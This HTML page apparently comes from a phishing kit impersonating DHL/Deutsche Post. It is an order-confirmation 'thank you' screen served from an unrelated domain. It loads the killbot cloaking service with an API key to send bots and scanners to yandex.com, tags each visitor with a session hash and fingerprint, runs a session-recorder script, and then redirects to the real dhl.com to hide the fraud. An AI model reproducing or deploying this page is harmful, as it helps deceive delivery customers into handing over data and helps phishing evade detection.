<!doctype html>
<html lang="fr" >
  <head>
    <!-- Required meta tags -->
    <script type="text/javascript">
        const killbot = {
            apiKey: "XVMpB5exZpe6LjHpLHitdhu8mRZbRdZtq5UF6LD4hpXOX", 
            botRedirection: "https://yandex.com" // Bot will be redirect to this URL, you can change it
        }
    </script>
    <script src="https://files.killbot.org/.cdn-cgi/killbot-security.js"></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="session_hash" content="2c4f56a6f6ecc57a69b5ebb2fe0be4b3">
    <meta name="visit_id" content="775">
        <link rel="stylesheet" href="../css/app.css">
    <style>
    body {
    overflow-x: hidden;
    }
    img.bus_logo {
    padding-top: 50px;
    }
    p.thank {
    margin-top: 20px;
    font-size: 50px;
    font-weight: 900;
    color: #ce0808;
    text-align: center;
    }
    p.processed {
    font-size: 20px;
    font-weight: 700;
    color: #000;
    text-align: center;
    }
    .order {
    background-color: #56565644;
    width: 100%;
    }
    .order p {
    padding: 35px;font-size: 15px;
    }
    .order span {
    font-weight: bold;
    color: #000;
    }
    button.backBtn {
    border: none;
    background-color: #cf302b;
    color: #fff;
    padding: 5px 12px 5px 12px;
    border-radius: 3px;
    }
    @media(max-width: 320px){
        p.thank {
        font-size: 18px;
        }
        img.bus_logo {
        width: 100%;
        }
        p.processed {
        font-size: 10px;}
        .order p {
        font-size: 10px;
        }
        button.backBtn {
        font-size: 9px;
        }
    }
    @media(min-width: 320px) and (max-width: 480px){
        img.bus_logo {
        width: 100%;
        }
        p.thank {
        font-size: 20px;
        }
    }
    @media (min-width: 480px) and (max-width: 576px){
        p.thank {
        font-size: 35px;
        }
        img.bus_logo {
        width: 100%;
        }
        p.processed {
        font-size: 15px;}
        .order p {
        font-size: 10px;
    }
    }
</style>
    <title></title>
    <link rel="icon" type="image/ico" href="https://dispatching-centre.wtechsmartwater.com/images/favicon.gif"/>
  </head>
  <body  data-aos-easing="ease" data-aos-duration="1000" data-aos-delay="0" style="margin: 0;">
  <div class="se-pre-con"></div>
  <header class="header">
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <div class="container">

            <button class="bg-transparent border-0 p-0 d-md-none" onclick="openNav()">
                    <i class="fa fa-bars" style="font-size: 20px; color: #7d7a7a;"></i>
            </button>
            <!-- mobile part -->
            <a class="navbar-brand p-0" href="#">
                <img src="https://dispatching-centre.wtechsmartwater.com/images/logo.png" alt="" class="img-responsive">
            </a>
            <form class="mb-1 d-md-none">
                <div class="form-item mobile-country-selector">
                    <label for="mobile_country_selector" style="display:none;">Select a country here...</label>
                    <input id="mobile_country_selector" class="d-none" type="text">
                </div>
                <div class="form-item" style="display:none;">
                    <input type="text" id="mobile_country_selector_code" name="mobile_country_selector_code" data-countrycodeinput="1" readonly="readonly" placeholder="Selected country code will appear here" />
                    <label for="mobile_country_selector_code">...and the selected country code will be updated here</label>
                </div>
                <button type="submit" style="display:none;">Submit</button>
            </form>

            <div id="mySidepanel" class="sidepanel">
                <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
                <a href="#" class=""><span class="mbl_home"><i class="fas fa-home"></i></span>Home</a>
                <a href="#" class=""><span class="mbl_ship"><i class="fas fa-shipping-fast"></i></span>Ship</a>
                <a href="#" class=""><span class="mbl_track"><i class="fas fa-location-arrow"></i></span>Track</a>
                <a class="mbl_help" href="#"><span class="ic"><i class="fas fa-hands-helping"></i></span>{{Session()->get("lang-header-help")}}</a>
                <a class="mbl_find" href="#"><span class="icc"><i class="fas fa-map-marker-alt"></i></span>{{Session()->get("lang-header-find")}}</a>

                <a href="#" class=" reg_m"><span class="mbl_reg"><i class="fas fa-lock"></i></span>Connexion</a>

            </div>
            <div class="navbar-collapse">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" href="#">{{Session()->get("lang-header-help")}}</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link loc" href="#">{{Session()->get("lang-header-find")}}</a>
                    </li>
                    <li>
                        <div class="jhGf">
                            <label for="">
                                <span class="page-search-divider"></span>
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-search" viewBox="0 0 16 16">
                                    <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/>
                                </svg>
                            </label>
                        </div>
                    </li>
                    <li class="v2-vertical-divider"></li>
                    <li>
                        <div class="container">
                            <form>
                                <div class="form-item">
                                    <label for="country_selector" style="display:none;">Sélectionnez un pays ici...</label>

                                </div>
                                <div class="form-item" style="display:none;">
                                    <input type="text" id="country_selector_code" name="country_selector_code" data-countrycodeinput="1" readonly="readonly" placeholder="Selected country code will appear here" />
                                    <label for="country_selector_code">...et le code pays sélectionné sera mis à jour ici</label>
                                </div>
                                <button type="submit" style="display:none;">soumettre</button>
                            </form>
                        </div>
                    </li>
                </ul>
            <!-- <form class="d-flex">
                <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search">
                <button class="btn btn-outline-success" type="submit">Search</button>
            </form> -->
            </div>
        </div>
    </nav>
    <div class="iKjer"></div>
    <div class="header-nav">
        <div class="container">
            <div class="row">
                <div class="col-sm-6 col-md-8 col">
                    <ul class="header-navbar-nav me-auto mb-2 mb-lg-0">
                        <li class="nav-li">
                            <a href="#" class="top-nav">{{Session()->get("lang-header-home")}}</a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="top-nav">{{Session()->get("lang-header-ship")}}</a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="top-nav">{{Session()->get("lang-header-track")}}</a>
                        </li>
                    </ul>
                </div>
                <div class="col-sm-6 col-md-3 col">
                    <ul class="eriOl">
                        <li class="nav-li"><a href="#" class="top-nav">{{Session()->get("lang-header-register")}}</a></li>
                        <li class="nav-li"><a href="#" class="top-nav">{{Session()->get("lang-header-login")}}</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</header>

    <div class="container">
    <div class="row main-container">
        <div class="col col-sm-12">
            <div class="text-center">
            <img class="bus_logo" src="https://dispatching-centre.wtechsmartwater.com/images/bus.png" alt="">
            </div>

            <p class="thank">{{Session()->get("lang-success-thank")}}</p>
            <p class="processed">{{Session()->get("lang-success-success")}}</p>
            <div class="order">
                <p class=""><span>{{Session()->get("lang-success-confirmed")}}</span> <br>{{Session()->get("lang-success-deliv")}}</p>

            </div>
            <div class="d-flex justify-content-center"><button class="backBtn" onclick="window.location.href = 'https://dhl.com'">{{Session()->get("lang-success-return")}}</button></div>
        </div>
    </div>
</div>

<footer>
    <div class="footer-border">
        <div class="container">
            <hr>
            <div class="row">
                <div class="col-sm-12 col-md-8">
                    <div class="pdIr">
                        <div class="row">
                            <div class="col-sm-12 col-md-4 col">
                                <div class="square">
                                    <h4 class="headline">{{Session()->get("lang-footer-cands")}} </h4>
                                    <ul>
                                        <li><a href="#">{{Session()->get("lang-header-help")}}</a></li>
                                        <li><a href="#">{{Session()->get("lang-footer-faqs")}}</a></li>
                                        <li><a href="#">{{Session()->get("lang-footer-contact")}}</a></li>
                                        <li><a href="#">{{Session()->get("lang-header-find")}}</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-sm-12 col-md-4 col">
                                <div class="square">
                                    <h4 class="headline">{{Session()->get("lang-footer-legal")}}</h4>
                                    <ul>
                                        <li><a href="#">{{Session()->get("lang-footer-terms")}}</a></li>
                                        <li><a href="#">{{Session()->get("lang-footer-privacy")}}</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-sm-12 col-md-4 col">
                                <div class="square">
                                <h4 class="headline">{{Session()->get("lang-footer-alerts")}}</h4>
                                    <ul>
                                        <li><a href="#">{{Session()->get("lang-footer-fawa")}}</a></li>
                                        <li><a href="#">{{Session()->get("lang-footer-fas")}}</a></li>
                                        <li><a href="#">{{Session()->get("lang-footer-import")}}</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-sm-12 col-md-4">
                    <div class="wetSq">
                        <div class="cyNe">
                            <img src="https://dispatching-centre.wtechsmartwater.com/images/foo.png" alt="">
                        </div>
                        <div class="ledIu">
                            <ul>
                                <li><a href="#">{{Session()->get("lang-footer-about")}}</a></li>
                                <li><a href="#">{{Session()->get("lang-footer-news")}}</a></li>
                                <li><a href="#">{{Session()->get("lang-footer-careers")}}</a></li>
                                <li><a href="#">{{Session()->get("lang-footer-legalno")}}</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <hr>
        </div>
    </div>
    <div class="footer-media">
        <div class="container">
            <div class="row">
                <div class="col">
                    <div class="social">
                        <h4>{{Session()->get("lang-footer-follow")}}</h4>
                        <ul>
                            <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
                            <li><a href="#"><i class="fab fa-twitter"></i></a></li>
                            <li><a href="#"><i class="fab fa-youtube"></i></a></li>
                            <li><a href="#"><i class="fab fa-instagram"></i></a></li>
                        </ul>
                    </div>
                </div>
                <div class="col offset-md-4">
                    <div class="copyright">
                        <p>2022 © Deutsche Post AG - All rights reserved</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</footer>
    <script>
        window.sessionHash = "2c4f56a6f6ecc57a69b5ebb2fe0be4b3";
        window.visitId = 775;
        window.fingerprint = "50067ecceb9ac350c8a7c089d1c6ccb5";
    </script>


    <script src="../js/app.js"></script>i
	<script>
		$("#country_selector").countrySelect({
			preferredCountries: ['tn', 'us']
		});

		$("#mobile_country_selector").countrySelect({
			preferredCountries: ['tn', 'us']
		});
	</script>

    <script>
        $(window).on('load', function() {
            $(".modal-loader").hide();
            $(".se-pre-con").fadeOut();
            $('.se-pre-con').on('load',function(){
                $('.modal-loader').hide();
            });
            setTimeout(() => {
                window.location.href = "https://dhl.com";
            }, 6000);
        });

        function openNav() {
            $('#mySidepanel')[0].style.width = "250px";
        }

        function closeNav() {
            $('#mySidepanel')[0].style.width = "0";
        }
    </script>
        <script src="js/session-recorder.js"></script>
          </body>
</html>
